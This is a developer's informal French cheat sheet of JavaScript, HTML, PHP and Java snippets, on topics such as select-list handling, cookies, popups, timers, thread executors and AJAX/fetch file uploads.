      {
        var zeros="";
      	txt=number+"";
      	i=txt.length;
      	if (i>4)
      	{
      	while(i>=4)
      	{
      	   zeros = zeros+'0';
      	  i--;
      	}
      	txt = txt.substring(0,3)+zeros;
        } 
        else if (i==4)
      	{
         zeros='000';
         txt = txt.substring(0,1)+zeros;
        }
      	else txt =0;
         alert (txt);
      	 return txt;
      }
pour arrondire un chiffre avec deux chiffres apres la virgule: attention il arrondi bien sinon ya Math.floor(x) qui arrondit au int en dessous: inferieur et Math.ceil() qui arrondi au dessus 
      Math.round(maVariable*100)/100 	
      ou
      String format = new DecimalFormat("##.##").format(Math.random() * 1000).replace(",",".");
        return Double.parseDouble(format);
pour faire un split : morceaux decouper separateur token
        alert(allsongs);
        			var reg=new RegExp("[ ,;]+", "g"); // va spliter sur espace, , et ;
        			var tableau=allsongs.split(reg);
        			for (var i=0; i<tableau.length; i++) { // attention: length ne marche que sur les tableaux javascript au plus simple c a dir de ce type: new Array("toto","titi",mon objet);  dans lequel on pourra faire: tata= montableau[0];
         			alert(tableau[i]);
         }
rendre un nombre entier sans virgule
  Math.round(monnombre);
activer ou desactiver un input: 
  document.getElementById('startFlag').disabled=true;
  document.getElementById('startFlag').disabled=false;
pour disabled un onclick disabled=true ne marche pas faire:
      document.getElementById("imgMuteProg").onclick="return false";
utilisation du .onclick: 
   xxx.onclick="xxx" ou xxx.onclick=function(){blabla};      
faire un bon catch exception :
    try{...}
		catch(error)    
		{
	      alert (error.name);
    	  alert (error.message);  
	      alert (err.stack);
	      throw "blabla";
	  }
    on peut aussi thrower une erreur directement: 
        throw "prompteur non trouvé";     	
pour selectionner tous les elements d'une select liste multiple: selectall selectlist:
	le bouton appelle: javascript:selectList(document.getElementsByName('typeBesoinOne.typeBesoinTwoSubmit')[0])
	la methode:
									function selectList(list) {
								  for(i = 0; i < list.options.length; i++) 
								  {
										list.options[i].selected=true;
								  }
								}
faire un substring : 
		value=value.substring(0, value.indexOf("too"));
pour savoir si un string commence par une chaine de caracteres
    value.indexOf("too")==0;
pour recuperer un element par son nom: 
									  var elSel = document.getElementsByName('nomMonChamp')[0];
pour faire un select qu'on peut remplir au vider a volonte avec un libelle et une cle:
			(ajouter en javascript des options a un select et supprimer des options à un select voir aussi ajouter des options)
			pour faire une selectbox à choix multiple avec un ordre modifiable des options:
			<html>
                                          <body>
                                          
                                          
                                          
                                          	<form action="#" method="post">
                                          				libelle document: <input type="text" id="libelle"></input>
                                          			<br />
                                          			date document: <input type="text" id="date"></input>
                                          			<br />
                                          			<input type="button" value="Ajouter Ligne" onclick="insertOption(count1++);updateList(document.getElementById('move'), document.getElementById('newList'))" />
                                          			<br />
                                          			<input type="button" value="Supprimer Lignes(s)" onclick="removeOptionSelected();updateList(document.getElementById('move'), document.getElementById('newList'))" />
                                          			<br />
								  <dl>
								    <dt><strong>Options:</strong></dt>
								      <dd>
								       <select id="move" multiple="multiple" size="10">
								        <option value="1">option 1</option>
								        <option value="2">option 2</option>
								
								        <option value="3">option 3</option>
								        <option value="4">option 4</option>
								        <option value="5">option 5</option>
								        <option value="6">option 6</option>
								        <option value="7">option 7</option>
								        <option value="8">option 8</option>
								
								        <option value="9">option 9</option>
								        <option value="10">option 10</option>
								       </select>
								      </dd>
								
								    <dt><strong>Order:</strong></dt>
								      <dd><input type="button" onclick="moveUp(document.getElementById('move'));updateList(document.getElementById('move'), document.getElementById('newList'));" value="Move Up"></dd>
								      <dd><input type="button" onclick="moveDown(document.getElementById('move'));updateList(document.getElementById('move'), document.getElementById('newList'));" value="Move Down"></dd>
								
								      <dd><input type="button" onclick="swap(document.getElementById('move'));updateList(document.getElementById('move'), document.getElementById('newList'));" value="Swap 2 Options"></dd>
								    C'est ca qu'on va envoyer au serveur quand on submit le formulaire (ne pas utiliser disabled qui n'est pas envoye dans le request): un champ cache:<dt><br><strong>New order:</strong> <input type="text" id="newList" name="newList" value="" readonly="readonly" style="border: none;"></dd>
								      <dd>(This input can be hidden and used to change the order server side)</dd>
								  </dl>
								</form>

                                          
                                          <div id="test">
                                          bla
                                          </div>
                                          <script>
                                          var count1 = 0;
                                          var count2 = 0;
                                          //var people = JSON.parse(contacts);
                                          
                                          //document.getElementById("test").innerHTML = people;
                                          		
                                          									function insertOption(num)
                                          											{
                                          											  var elSel = document.getElementById('move');
                                          											    var elOptNew = document.createElement('option');
                                          											    if (document.getElementById('libelle').value.length>0)
                                          											    {
                                          												    elOptNew.text = document.getElementById('libelle').value;
                                          												    elOptNew.value = 'insert' + num;
                                          												    var elOptOld = elSel.options[0];  
                                          												      elSel.add(elOptNew, elOptOld); // attention!! une option ne peut pas etre utilisee sur deux selects differents
                                          												      ou bien 
                                          												       elSel.add(elOptNew); pour rajouter à la suite.
                                          												    document.getElementById('libelle').value="";
                                          												 }
                                          											  }              
                                          											comme ca ca marche mieux: 
                                                                pour faire deux selects qui se transvasent: 
                                                                
                                                                    function insertOption(type)
                                                											{
                                                												  var elSel = document.getElementById('move'+type);
                                                												var desSel = document.getElementById('dest'+type);
                                                											  for (i=elSel.options.length-1; i>-1; i--)
                                                											  {
                                                    											  if (elSel.options[i].selected)
                                                    											  {
                                                        											  var tmp = elSel.options[i];
                                                        											  elSel.remove(i);
                                                        												desSel.add(tmp);
                                                        											}
                                                											  }
                                                										}  
                                          										function loadOptionSelected()
                                          										{
                                          											 var elSel = document.getElementById('move');
                                          											  var i;
                                          											  for (i = elSel.length - 1; i>=0; i--) {
                                          											    if (elSel.options[i].selected) {
                                          											    document.getElementById('libelle').value=elSel.options[i].text;
                                          											  }
                                          											}
                                          										}
                                          										function removeOptionSelected()
                                          											{
                                          											  var elSel = document.getElementById('move');
                                          											  var i;
                                          											  for (i = elSel.length - 1; i>=0; i--) {
                                          											    if (elSel.options[i].selected) {
                                          											      elSel.remove(i);
                                          											    }
                                          											  }
                                          											}
                                          											function updateOptionSelected()
                                          											{
                                          											  var elSel = document.getElementById('move');
                                          											  var i;
                                          											  for (i = elSel.length - 1; i>=0; i--) {
                                          											    if (elSel.options[i].selected) {
                                          											      elSel.options[i].text=document.getElementById('libelle').value;
                                          											    }
                                          											  }
                                          											}
                                          											function appendOptionLast(num)
                                          											{
                                          											  var elOptNew = document.createElement('option');
                                          											  elOptNew.text = 'Append' + num;
                                          											  elOptNew.value = 'append' + num;
                                          											  var elSel = document.getElementById('move');
                                          											
                                          											  try {
                                          											    elSel.add(elOptNew, null); // standards compliant; doesn't work in IE // attention!! une option ne peut pas etre utilisee sur deux selects differents
                                          											    ou
                                          											    elSel.add(elOptNew); pour rajouter à la suite.
                                          											  }
                                          											  catch(ex) {
                                          											    elSel.add(elOptNew); // IE only// attention!! une option ne peut pas etre utilisee sur deux selects differents
                                          											  }
                                          											}
                                          											
                                          											function removeOptionLast()
                                          											{
                                          											  var elSel = document.getElementById('move');
                                          											  if (elSel.length > 0)
                                          											  {
                                          											    elSel.remove(elSel.length - 1);
                                          											  }
                                          											}
                                          
                      moveUp=function(element) {
								  for(i = 0; i < element.options.length; i++) {
								    if(element.options[i].selected == true) {
								      if(i != 0) {
								        var temp = new Option(element.options[i-1].text,element.options[i-1].value);
								        var temp2 = new Option(element.options[i].text,element.options[i].value);
								        element.options[i-1] = temp2;
								        element.options[i-1].selected = true;
								        element.options[i] = temp;
								      }
								    }
								  }
								}
								moveDown=function(element) {
								  for(i = (element.options.length - 1); i >= 0; i--) {
								    if(element.options[i].selected == true) {
								      if(i != (element.options.length - 1)) {
								        var temp = new Option(element.options[i+1].text,element.options[i+1].value);
								        var temp2 = new Option(element.options[i].text,element.options[i].value);
								        element.options[i+1] = temp2;
								        element.options[i+1].selected = true;
								        element.options[i] = temp;
								      }
								    }
								  }
								}
								updateList=function(list, textBox) {
								  textBox.value = '';
								  for(var i = 0; i<list.options.length; i++) {
								    if (i == 0) {
								      textBox.value += list.options[i].value;
								    } else {
								      textBox.value += ',' + list.options[i].value;
								    }
								  }
								}
								swap=function(list) {
								  var j = 0;
								  for(i = 0; i < list.options.length; i++) {
								    if(list.options[i].selected == true) {
								      j++;
								      switch (j) {
								        case 1:
								        var i1 = i;
								        var temp = new Option(list.options[i].text, list.options[i].value);
								        break;
								        case 2:
								        var i2 = i;
								        var temp2 = new Option(list.options[i].text, list.options[i].value);
								        break;
								      }
								    }
								  }
								  if (j != 2) {
								    alert('Only 2 items can be swapped');
								  } else {
								    list.options[i1] = temp2;
								    list.options[i1].selected = true;
								    list.options[i2] = temp;
								    list.options[i2].selected = true;
								  }
								}
								
								addLoadEvent=function(func) {
								  var oldonload = window.onload;
								  if (typeof window.onload != 'function') {
								    window.onload = func;
								  } else {
								    window.onload = function() {
								      if (oldonload) {
								        oldonload();
								      }
								      func();
								    }
								  }
								}
								
								addLoadEvent(function() {
								 updateList(document.getElementById('move'), document.getElementById('newList'));
								});

                                          </script>
                                          </body>
                                          </html>
pour faire une confirmation dans une fenetre fille qui rafraichit les elements de la fenetre parente:
		<body onunload="confirmeOk();">
		<?php echo javascript_tag("
				  function confirmeOk()
				  {
					  if(confirm('Validez vous cette verification?')) ou  if(confirm('<bean:message key="SYS_DELETE" />'))
				  {
						opener.document.getElementById('mask').style.display='inline'; // inline si c du texte, block si c'est un div( avec une image par exemple)
						location.reload(); 
						} 
				  }
		") ?>
		
		dans fenetre parente: <div id="mask" style="display:none"><?php echo submit_tag('Valider d&eacute;finitivement') ?></div>
Si j'ai l' erreur cette objet ne gere pas cette propriete ou cette methode
		verifier que je n'ai pas oublie de declare ma variable avec "var"
pour rediriger vers une autre page en javascript: redirect url
			document.location.href='http://www.univ-tours.fr/lat'

Pour submiter en ouvrant une nouvelle fenetre: 
			<form target="toto" action="toto.html" method="get" onsubmit="window.open('','toto');alert('ouverture de la fenetre');return true; ou plutot false;">			
 				window.open("aeffacer2.html","nom_popup","menubar=no, status=no, scrollbars=no, menubar=no, width=200, height=100");		
Pour ouvrir une fenetre comme windows open mais qui empeche l'utilisateur d'agir sur la fenetre mère =fenetre modale: (window.)showmodaldialog() (et pour le retour faire: retour = window.showModalDialog(uri[, arguments][, options]);) NE MARCHE QUE SUR LES NAVIGATEURS INTERNET EXPLORER C UNE FONCTIONALITE INHERANTE A CE BROWSER. DE PLUS IMPOSSIBLE DE METTRE UNE SUBMISSION DE FORMULAIRE DANS LA FENETRE MODALE CAR IL OUVRE UNE NOUVELLE FENETRE APRES ALLER RETOUR SERVEUR
				attention sur IE ca ne garde pas la session (cookie) de l'utilisateur contrairement à window.open()
				le code renault qui va avec: 
							<renault:modalDialogScreen>      // attention styleId je crois que ca devient l'id de mon champ html
								<renault:modalDialogBox styleId="PreviewBox" width="800px" height="400px" key="Title">
							<jsp:include flush="true" page="/jsp/loginblocs/test.jsp" />
							</renault:modalDialogBox>
							</renault:modalDialogScreen>
				on peut aussi faire: 
    			window.open("","wChallenge", ...)
					targetForm.target = 'wChallenge';
					targetForm.submit();
pour sauver ecrire recuperer les cookies : en javascript: LINKcooklskjhh
              function getCookie()
              {
              	try
              	{
              		// cookies are separated by semicolons
              		var aCookie	= document.cookie.split(";");
              		for (var i=0; i < aCookie.length; i++)
              		{
              			// a name/value	pair (a	crumb) is	separated	by an	equal	sign
              			if (aCookie[i].indexOf("CodeCR") >= 0)
              			{
              				return unescape(aCookie[i].substr(aCookie[i].indexOf("CodeCR") + "CodeCR".length + 1));
              			}
              		}
              		// a cookie	with the requested name	does not exist
              		return null;
              	}
              	catch(lException)
              	{
              		return null;
              	}
              }
              function setCookie(valeurDuCookies) LINKcooklskjhh
              {
              	try
              	{
              		var today = new Date();
              		var expires = new Date();
                      expires.setTime(today.getTime() + (365*24*60*60*1000));
              		var nouveauCookie = "CodeCR=" + valeurDuCookies +
              			"; expires=" + expires.toGMTString();
              			
              		document.cookie = nouveauCookie;
              	}
              	catch(lException)
              	{
              	}
              }							
pour executer du javascript a chaque fois qu'on appuie sur le clavier, qu'on presse un bouton, qu'on change la valeur d'un champ:
		onKeyUp // et non pas onchange qui s'execute au changement du focus
pour qu'une fenetre fille quand elle se ferme fasse une action dans la fenetre parente: affiche ou masque une div
				<body onunload="confirmeOk();">
				<?php echo javascript_tag("
				     function confirmeOk()
				    {
				      if(confirm('Validez vous cette verification?'))
					     {
				  	      opener.document.getElementById('mask').style.display='inline';// inline si c du texte, block si c'est un div( avec une image par exemple)
				       }
				") ?>
dans fenetre parente: <div id="mask" style="display:none"><?php echo submit_tag('Valider d&eacute;finitivement') ?></div>


pour recharger la fenetre parente: 
		window.opener.location.reload();
pour recharger la fenetre à partir d'une iframe 
    window.top.location.reload();	
    ou 
     document.location.reload(true)	
     ou 
      window.top.location='/{!Lead.id}'; //une adresse (la ca marche sur salesforce)
pour appeller une methode du frame parent: self.parentWindow.mamethode();  ou document.parentWindow.mamethode();
pour appeller une methode de la fenetre parente: window.opener.monFormulaire 
ou window.opener.maFonctionJavascript ...(pas sur)
			autre exemple: opener.document.getElementById('mask').style.display='inline';// inline si c du texte, block si c'est un div( avec une image par exemple)
pour voir quel est le caractere numero x d'une variable:
		 on utilise charAt: idDemande.charAt(0) == "D" Regarde le premier caractere de id_demande
pour selectionner un element du select:
		document.forms[0].titi.options[1].selected=true;
pour recuperer et mettre dans un tableau la valeur d'un select:
	 	sous explorer pas besoin de se prendre la tete mais sous netscape:
		Dec[8] = document.frmForm0.inpPays2.options[document.frmForm0.inpPays2.selectedIndex].value ;
pour supprimer une chaine de caractère dans une autre chaine de caractère partout où elle occure: occurence
		 s=s.replace("&","*am*");
pour compter le nombre d'occurence d'une chaine de caractères: 
  textarea.value.split("passage à la ligne" ).length 
pour faire un message de confirmation de type prompt:
			if(confirm('Voulez-vous visiter le site du laboratoire Archeologie et Territoire ?'))
			{
				document.location.href='http://www.univ-tours.fr/lat'
			}
			else
			{
			blah...
			}
pour minuter en secondes: execution avec delais:
    function logoMsg()
    {
    document.getElementById('mask').style.display="none";
    }
    setTimeout("logoMsg()",3000);
pour supprimer un timeout
      var monTimeout = setTimeout("logoMsg()",3000);
      clearTimeout(monTimeout);  
Les thread : threads : (ne jamais mettre un controlleur spring dans un thread) (si j'ai RejectedExecutionException c parce que j'ai stoppé un thread et après je lui demande encore un truc malgre tout)
    Chaque Thread a son stack.
      Si commplexe, ne plus utiliser les treads directement mais passer par un ExecutorService (a faire voir aussi ExecutorCompletionService )
        ExecutorService : pour faire un traitement par packets blocs blocks paquets: je traite une longue liste: je la divise en plusieurs et je traite chaque sous liste dans un thread soit en parallele soit les uns apres les autres
           public List<Future<DossierCommitResult>> doIMportExcell(final IHRUser hrUser, final IHRRole hrRole, final List<T> entries, final ExcelTemplate excelTemplate, final boolean simulation, final IDossierDAO<T> dao) throws InterruptedException {
              		List<List<T>> entriesPartition = MyPartition.partition(entries, 100);   // sous diviser sousdiviser decouper ma liste en plusieurs listes de 100elmts
                  Set<Callable<DossierCommitResult>> threadList = new HashSet<Callable<DossierCommitResult>>();
              				ExecutorService execute = Executors.newSingleThreadExecutor(); // pour une execution d'un thread les uns a la suite des autres
                  		//ExecutorService execute = Executors.newFixedThreadPool(2); // pour une execution de 2 threads à la fois. 2 doit etre recupéré par int proc = Runtime.getRuntime().availableProcessors(); // permet de recuperer le nb de threads simultanes possibles
                  		for (final List<T> entriesblock : entriesPartition) {
                  			Callable<DossierCommitResult> callable = new Callable<DossierCommitResult>() {
                                  public DossierCommitResult call() throws Exception {
                            					DossierCommitResult commitResult = dao.write(hrUser, hrRole, excelTemplate, entriesblock, simulation, Integer.parseInt(partitionMaxSize));
                            					System.out.println("aa");
                            					Thread.sleep(100);
                            					return commitResult;
                  				}
                              };
                  			//execute.shutdown(); laisser les tasks en cours se terminer mais ne plus accepter de nouvelles tasks
                  			//execute.shutdownNow(); ne plus accepter de nouvelles tasks et Stopper les tasks en cours
                  			// execute.awaitTermination(500, TimeUnit.MILLISECONDS); A mettre apres un shutdown: arrête l'execution du thread principal et attends que toutes les taches soient terminees si toujours pas et que le timeout est atteind alors force l'arret des threads et continue
                         threadList.add(callable);
                  		}
                  		List<Future<DossierCommitResult>> futures = execute.invokeAll(threadList); // ici invokeAll alors que invokeAny execute la premiere task et c tout.
                  		                                            execute.execute(UnRunnable) // possible aussi pour executer un thread LINKRunnable
                          // checks for thread termination // ne pas mettre de points d'arret de debuggate dans le traitement des futures parce que ça risque de te faire croire que ça ne marche pas alors que ça marche
                          /*final boolean isTerminated = execute.isTerminated();
                          System.out.println(isTerminated);*/
                          execute.shutdownNow(); // a mettre apres la recuperation des futures dans des objets à moi. pas avant.
                  		return futures;
                  	}
                  }
          les treads : si complexe ne plus utiliser les treads dirrectement mais passer par un ExecutorService         
         currentThread( ) 	 Thread 	 Returns an object reference to the thread in which it is invoked.
         getName( ) 	 String 	 Retrieve the name of the thread object or instance. Exemple: pas la peine de mettre un incrementeur,  dans le thread mettre : logger.info("executing thread"+this.elementblocknumber+" threadsname: "+Thread.currentThread().getName());
         start( ) 	 void 	 Start the thread by calling its run method. On ne peut pas appeler cette methode deux fois sur un meme thread. Si on veut le faire il faut créer un nouveau thread puis faire start.
         run( ) 	 void 	 This method is the entry point to execute thread, like the main method for applications.
         sleep( ) 	 void 	 Suspends a thread for a specified amount of time (in milliseconds).
         isAlive( ) 	 boolean 	 This method is used to determine the thread is running or not.
         activeCount( ) 	 int 	 This method returns the number of active threads in a particular thread group and all its subgroups.
         interrupt( ) 	 void 	 The method interrupt the threads on which it is invoked.
         yield( ) 	 void 	 By invoking this method the current thread (Thread.yield();) pause its execution temporarily and allow other threads to execute. quand ils ont fini ça reprend la suite de l'execution
         join( ) 	 void 	 This method and  join(long millisec) Throws InterruptedException.  These two methods are invoked on a thread. These are not returned until either the thread has completed or it is timed out respectively.
       Depuis java7 ou java8 pour demarrer un thread:     LINK84838
        Thread th= new Thread(() -> ce qui est execute); (// a partir de java10 apparemment) contraction
        th.start();// execution en paralele th.run() // execution immediate pas en parallele aucun interet apparemment ne pas utiliser
			pour faire attendre la fin d'un ou plusieurs threads avant de poursuivre le programme main: 
			utiliser join. Exemple:
									public static void main (String args []) {
								    Coureur c [] = {new Coureur ("un", 2000),new Coureur ("deux", 3000),new Coureur ("trois", 1800)} ;	
								    for (int i = 0 ; i < c.length ; i ++) c [i].start () ;
								    for (int i = 0 ; i < c.length ; i ++) {
								      try {
								        c [i].join () ; // lors du premier passage, tant que c[0] n'est pas fini, il s'arrete là: c1 c2 c3 etc ne s'executent pas tant que c0 n'a pas fini en fait tout le monde attend. Meme main.
								      } catch (InterruptedException e) {
								        System.out.println ("InterruptedException sur " + c [i].nom ()) ;
								      }
								    }
								    System.out.println ("Fin de la course") ;
								  }
								}

			pour faire pauser un thread: sleep(duree ms), wait, ne pas utiliser suspend() LINK84838
					public class MonThread extends (java.lang)Thread (ne jamais mettre un controlleur spring dans un thread) LINK84838 
					{
					private	mes variables; (faire les getters et setters)
					  public void run() 
					  {
					  	// pour s'assurer que le thread tourne
					  			long start = System.currentTimeMillis();
					  			  if ( System.currentTimeMillis() == start + (1000 * 5))) 
					  			  {
					  			  	System.out.println("start");
					  					start = System.currentTimeMillis();  
					  			  }
				    		// faire quelque chose
			  		}
			  		ou bien pour faire un thread qui dure un temps defini: (ne jamais mettre un controlleur spring dans un thread)
					  public void run() 
					  {
                	  			long start = System.currentTimeMillis();
                	  			long end = System.currentTimeMillis() + (1000*8);
                	  			log.debug("start");
                	  			log.debug(start);
                	  			log.debug("end");
                	  			log.debug(end);
                
                	  			  while ( System.currentTimeMillis() <= end) 
                	  			  {
                	  					start = System.currentTimeMillis();
                	  					log.debug(start);
                	  					// faire quelque chose
                	  			  }
    				}
					dans ma classe appelante: 
												 MonThread thread = new MonThread(); (ne jamais mettre un controlleur spring dans un thread)
												    // Activation du Thread
												    thread.start();
											   	    // tant que le thread est en vie...
												    while( thread.isAlive() ) {
												      // faire un traitement...
												      System.out.println("Ligne affichee par le main");
												      try 
												      {
												        // et faire une pause
												        Thread.sleep(800);
												      }
												      catch (InterruptedException ex) {}
												    }
												  }
.wait() et .notify() :
 	sur un meme objet java (pas forcement un thread), wait() met en pause l'execution tant que sur ce meme objet notify() n'est pas execute. 
  c'est une ancienne façon de gérer les threads. En general on met ces trucs là dans des blocks synchronized
  comme ca : synchronized (this){this.notify();} attention si le notify arrive avant le wait alors je vais attendre infiniment
synchronisation : (voir aussi volatile) 
						void methode() {
						    synchronized(this) {
						        //section critique DONC ATTENTION, C'EST TOUT L OBJET QUI CONTIENT CETTE METHODE QUI EST LOCKE; PAS SEULEMENT CETTE METHODE DE L OBJET!!!
						    }
						}
		est equivalent a 
						synchronized void methode() {
						    //section critique  DONC ATTENTION, C'EST TOUT L OBJET QUI CONTIENT CETTE METHODE QUI EST LOCKE; PAS SEULEMENT CETTE METHODE DE L OBJET!!!
						}
		est equivalent en java 1.5 a 
					void methode() 
					{
							Lock l = new ReentrantLock();
							l.lock();
							try 
							{
								    //section critique
							} 
							finally 
							{
								    l.unlock();
							}
					}
		attention
						synchronized(maListe) 
						{
				    			maListe = new ArrayList<String>();
						}
						ne marche pas si maListe n'est pas final car "maListe" est une reference a l'objet. Pas l'objet lui meme (pointeurs)
pour faire une liste synchronisee entre plusieurs threads (dans une classe qui va etre partagee par plusieurs threads j'ai la liste. Dans cette classe le code c'est : 
          public class AspFile {
            private static transient LinkedList<AspFile> allAspFiles= new LinkedList<AspFile>() {
          		@Override
          		public void addLast(AspFile o) {
          			synchronized (this) {
          				super.addLast(o);				
          			}
          		}
          		public AspFile removeFirst() {
          			synchronized (this) {
          				return super.removeFirst();				
          			}			
          		};
          	};      
pour executer un code regulierement à interval regulier: 
          Lance un traitement javascript code repete à intervalle regulier de delai millisecondes.
          Ce traitement à intervalle regulier peut être arrête avec clearInterval().
          var timer=setInterval("Horloge()", 1000);			    
pour arreter le interval  precedemment defini avec setInterval().
             clearInterval(recordInterval);
pour changer le contenu d'un element
				Utiliser InnerHTML
				<style type='text/css'>
				#textDiv { position:absolute; top:8; right:8; border-style:solid; border-width:thin; background:lightgrey;}
				</style>
				<div id="textDiv"></div>
				 document.getElementById("textDiv").innerHTML = 'blablabla';
pour rendre invisible un div, masquer un div: style.display=none
			exemple:  <div id="mask" style="display:none">
			attention si on veut rendre invisible une ligne d'un tableau: ca ne marche pas avec les div. Il faut mettre l'id dans la balise <tr>!!
Pour reafficher un div masque qui aurait comme id "mask": 
			 opener.document.getElementById('mask').style.display='inline';// inline si c du texte, block si c'est un div( avec une image par exemple)
Pour recuperer des variables de la page html, les convertir en chiffre, faire des calculs avec et reecrire le resultat dans un div:
function calcTotal(objet,euros)
              {
                  var total=document.getElementById('total').innerHTML;
                  totalNum=parseFloat(total);
                  eurosNum=parseFloat(euros);
                  if (objet.checked) total=totalNum+eurosNum;
                  else total=totalNum-eurosNum;
                  document.getElementById('total').innerHTML=total;
              }
pour convertir un chiffre en string on peut utiliser toString()
      numacteurEnCours[i]=(numacteurEnCours[i]-1).toString();
fetch :
    remplace ajax
    var myHeaders = new Headers();
            var myInit = { method: 'GET',
                       headers: myHeaders,
                       //mode: 'cors',
                       //cache: 'default' 
                       };
        ou var myInit={
                        method:'POST',
                        body:new FormData(unformulaire),
                        credentials:'include'
                    }
        fetch('uneURL',myInit) // returne une promise
        .then(function(response) {
          return response.blob(); ou response.status==200
        })
        .then(function(myBlob) {
          var objectURL = URL.createObjectURL(myBlob);
          myImage.src = objectURL;
        });      
ajax : // xmlhttprequest est remplacé maintenant par fetch (voir fetch.)
                        ans = canvas.toDataURL("image/png");  //Pour sauver un canvas sur le serveur en image png ou jpg il faut obligatoirement envoyer les donnees en POST sinon le fichier genere est pourri:
            	    		var formData = new FormData(document.getElementById("forText")); // forText est juste un formulaire html recuperable avec document.getElement...ATTENTION les champs de mon formulaire doivent avoir un name sinon ils ne sont pas ajoute dans les formdata 
                            formData.append('ans', ans); // Append extra data before send.
                            formData.append('idp', idprojetEnCours); // Append extra data before send.
                            formData.append('fs', askValidator.fs); // Append extra data before send.
                      var xhr = new XMLHttpRequest();
                     // ne pas mettre ces lignes ci dessous sinon ca ne marche pas... ??....pq?
                      /*      xhr.onreadystatechange = onStateChange; 
                              xhr.setRequestHeader("Content-Type", "multipart/form-data"); 
                              ou
                              xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); Si on ne veut pas que notre formulaire puisse envoyer des fichiers: on recupere que les parametres string. 
                              et
                              xhr.setRequestHeader("X-File-Name", file.fileName);
                              xhr.setRequestHeader("X-File-Size", file.fileSize);
                              xhr.setRequestHeader("X-File-Type", file.type);
                        */

            	    		xhr.open('POST', "AudioLoopOnlinePushAnsDRW.php ou url", true); ou xhr.open('POST', form.action, true); // alors remplir le payload LINK564894
                      ou
                      xhr.open("POST", "/musclesWeb/strongPassword?action="+JSON.stringify(jsontable), true); //alors mettre au dessus: xhr.setRequestHeader("Content-Type", "application/json"); recuperable dans servlet java: httpServletRequest.getParameter("action"); voir convert conversion champs formulaire en json LINKç'ç'ç"_() 
                      ou
                      xhr.open("GET", "AudioLoopOnlineDownloadText.php?target=sons/"+idprojetEnCours+"/"+numfichierEnCours+"_"+cursec+".txt", true);
                      si probleme d'encodage lors de l'envoi si j'ai une page en ISOetc etc... ma base aussi mais il faut que lors de l'envoie je specifie bien l'encodage:
                      xhr.overrideMimeType("text/html; charset=ISO-8859-15"); (sinon en base il enregistre de la m...) si je veux envoyer du javascript, le mime c'est "application/javascript"
                      xhr.responseType = 'text';
                      
                    $.ajax({url:"xxx",success:qdcfini}) // jamais teste... marche pas car $ inconnu
                    qdcfini=(res)=>{alert(res)} // jamais teste
                

                    xhr.onloadstart=function(e)
                    {
                      printStacktrace(req.name);
                      // quand le chargement a demarre
                    };
                    xhr.onload = function(e) { // retour du serveur: "e" c'est progressEvent et "this" c'est la reponse du serveur
                            printStacktrace(req.name);
                            askValidator.class_AskValidator.record.call(this);
                              if (this.status == 200) {
                              try
                                {
                                  console.log(e.target.response);
                                  console.log(this.response);
                                   values =JSON.parse(this.response); ou document.getElementById("resultSend").innerHTML =e.target.response;
                                    if(callback!=undefined && callback!=null) // si callback est une fonction en entree
                                      {
                                        callback(params);
                                      }                      
                                } 
                                catch(e)
                                {
                                  console.log(this.response);
                                  console.log(e);
                                  ...
                     xhr.onComplete = function(transport) // je ne sais pas si ca sert vraiment 
                      {
                         if (200 == transport.status) 
                         {
                            result = transport.responseText;
                            //console.log("aaa"+result.target.response);
                        }
                      };
                      pour faire une progresse bar de chargement:
                      xhr.upload.addEventListener("progress",  onUploadProgress, false); //on s'abonne à l'evenement progress pour savoir où en est l'upload
                                  et
                                                            function onUploadProgress(event) {
                                                               if (event.lengthComputable) {
                                                                       yourProgressBar.style.width = (event.loaded / event.total) * 100 + "%";
                                                                ...                      
                      ou
                      xhr.upload.onprogress = function(e) // est appele plusieurs fois pendant le chargement (pour faire une progressbar) <progress min='0' max='100' value='0'>0%</progress> //pour faire une barre de progression  et un upload de formulaire contenant un fichier et des champs: 
                       {
                            callback('Upload Progress ' + Math.round(event.loaded / event.total * 100) + "%");
                            ou
                            if (e.lengthComputable) 
                            {
                              var progressBar = document.querySelector('progress');
                              progressBar.value = (e.loaded / e.total) * 100;
                              progressBar.textContent = progressBar.value; // Fallback for unsupported browsers.
                            }
                                              	    		
                      xhr.send(file); // marche pas.. plutot envoyer le formulaire comme ci-dessous            	    		
            	    		xhr.send(formData); // on utilise ça que pour du multipart: envoi de fichier ou canvas voir côte servlet là:LINKee"(çà)"
            	    		xhr.send(txt); // ou txt = "file=" + url +  "&content=" + content; // on utilise ça en Post. pour Get voir plus haut. Alors request.getParameter marche (je crois)
            	    		ou 
   		      	    		xhr.send(json); // ou json = JSON.stringify(jsonobject) du coup mon json est dans le payload. Pour le recuperer cote serveur:LINK564894. voir comment je construit ce json avec un formulaire html:LINKç'ç'ç"_() 
                      ou 
2                      xhr.send(null); xhr.send(); // si c'est du GET voir plus haut

                      return false; // Prevent page from submitting.
                	    }
        Cote php :
                    $idp= $_POST["idp"];
                  	$ans= $_POST["ans"];
                  	$fs= $_POST["fs"];
                  	$path="sons/".$idp."/ANS/".$_SESSION['uid']."/".$fs;
                  	if (!is_dir($path))
                  	{
                  		mkdir($path, 0755, true);
                  	}
                  	// fin cree le repertoire si n'existe pas
                  	$ans =  substr($ans,strpos($ans,",")+1);
                  	$decodedData = base64_decode($ans);
                  	$fp = fopen ($path."/ans.png", "w");
                  	fwrite($fp, $decodedData);
                	fclose ($fp);
                }
                        
faire un speech input:
              <input type="text" x-webkit-speech>
              function inputChange(e) {
                if (e.results) { // e.type == 'webkitspeechchange'
                  for (var i = 0, result; result = e.results[i]; ++i) {
                    console.log(result.utterance, result.confidence);
                  }
                  console.log('Best result: ' + this.value);
                }
              }
              var input = document.querySelector('[x-webkit-speech]');
              input.addEventListener('change', inputChange, false); // c'est ce genre de listener "change" qu'il faut utiliser pour les checkbox et radio pour detecter quand ils changent de statut mais après il faudra tester si ils sont checkes ou pas
              input.addEventListener('webkitspeechchange', inputChange, false);                            
requirejs : require.js : require : approximatif: a bien améliorer
        <script data-??="path/nomfichierdeconfigurationrequire" src="require.js"/> // charge le fichier de configuration lorsque require.js se charge : c facultatif mais pratique: ce fichier de configuration sert juste à définir des alias pour les librairies qu'on va charger avec les fonctions require et define.
        <script>
              require(["alias1","alias2","toto3"],function(variableEgaleAModuleDeAlias1, variableEgaleAModuleDeAlias2,toto3) // respecter l'ordre. Les noms c'est comme on veut.
              {
                  variableEgaleAModuleDeAlias1.UneMethodeDuModuleLibrairieDeAlias1():
              });
        </script>
        dans un autre fichier qui s'appelle toto3.js on defini un module:
         <script>
          define(["autrelibrairie1","autrelibrairie2"],function(al1,al2){  // define va faire que toto3(ici) sera dispo comme module ci dessus. 
              code avec al1 et al2...
          }
